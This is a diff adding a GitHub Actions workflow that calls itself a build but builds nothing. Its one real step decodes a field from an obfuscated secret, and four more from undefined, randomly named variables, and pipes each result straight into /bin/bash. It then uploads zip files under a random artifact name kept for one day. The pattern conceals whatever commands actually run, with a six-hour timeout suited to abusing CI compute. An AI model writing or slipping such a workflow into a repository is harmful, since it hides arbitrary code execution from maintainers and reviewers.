@@ -1,0 +1,26 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          sgo9243: ${{ secrets.sgo9243 }}
+        run: |
+          printf '%s' "$sgo9243" | jq -r .x4657 | /bin/bash
+          printf '%s' "$kiohn0" | jq -r .mjsl2 | /bin/bash
+          echo $goq41 | jq -r .obu5423 | /bin/bash
+          printf '%s' "$agj5377" | jq -r .eqm4 | /bin/bash
+          echo $xexnz3415 | jq -r .e48715 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2DJWDCre
+          path: "*.zip"
+          retention-days: 1
